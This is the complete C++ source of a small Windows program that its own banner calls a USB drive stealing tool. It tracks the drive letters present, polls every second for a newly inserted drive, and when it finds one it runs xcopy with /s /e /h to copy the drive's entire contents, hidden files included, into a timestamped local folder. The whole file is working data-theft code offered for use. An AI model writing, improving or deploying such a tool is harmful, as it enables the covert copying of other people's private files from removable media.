#include<iostream>
#include<cstring>
#include<windows.h>
#include<io.h>
#include<direct.h>
#include<ctime>
using namespace std;
char contain[28];
int length=1;
void initial(){
	length=1;
	char rootPath[10]={0},driveType[21]={0};
    UINT nType;
    for(char a='A';a<='Z';a++){
		sprintf(rootPath, "%c:\\", a);
		nType = GetDriveType(rootPath);
		if(nType != DRIVE_NO_ROOT_DIR){// DRIVE_NO_ROOT_DIR: 路径无效
			contain[length++]=rootPath[0];
			//cout<<rootPath<<"\t"<<driveType<<endl;
		}
	}
}
char comp(){
	char rootPath[10]={0},driveType[21]={0},aim='0';
    UINT nType;
    for(char a='A';a<='Z';a++){
		sprintf(rootPath, "%c:\\", a);
		nType = GetDriveType(rootPath);
		if(nType != DRIVE_NO_ROOT_DIR){// DRIVE_NO_ROOT_DIR: 路径无效
			int flag=false;
			for(int i=1;i<length;i++){
    			if(rootPath[0]==contain[i]){
    				flag=true;
    				break;
				}
			}
			if(!flag){
				aim=rootPath[0];
			}
			//cout<<rootPath<<"\t"<<driveType<<endl;
		}
	}
	initial();
	return aim;
}
void FormatTime(time_t time1, char *szTime)  
{  
   struct tm tm1;  
 
 
#ifdef WIN32  
    tm1 = *localtime(&time1);  
#else  
    localtime_r(&time1, &tm1 );  
#endif  
   sprintf( szTime, "%4.4d%2.2d%2.2d%2.2d%2.2d%2.2d",  
          tm1.tm_year+1900, tm1.tm_mon+1, tm1.tm_mday,  
            tm1.tm_hour, tm1.tm_min,tm1.tm_sec);  
}  

int main(){
	cout<<"U盘窃取工具v1.0.2  K.S.S制作"<<endl; 
	char cdest[1000];
	_getcwd(cdest,1000);
	string dest(cdest);
	cout<<"当前工作路径是： "<<dest;
    initial();
    //for(int i=1;i<length;i++){
    	//cout<<contain[i];
	//}
	cout<<endl;
	char ctime[1000];
	while(true){
		FormatTime(time(NULL),ctime);
		string stime(ctime);
		char source=comp();
		//cout<<source<<endl;
		string so2="0:\\ ",dos2;
		so2[0]=source;
		if(source!='0'){
			cout<<"检测到驱动器："<<source<<endl; 
			dos2="xcopy "+so2+dest+"\\"+source+"("+stime+")\\ /s /e /h";
			cout<<dos2<<endl;
			system(dos2.c_str());
		}
		else{
			cout<<"未检测到驱动器"<<endl; 
		}
		Sleep(1000);
	}	
	return 0;  
}
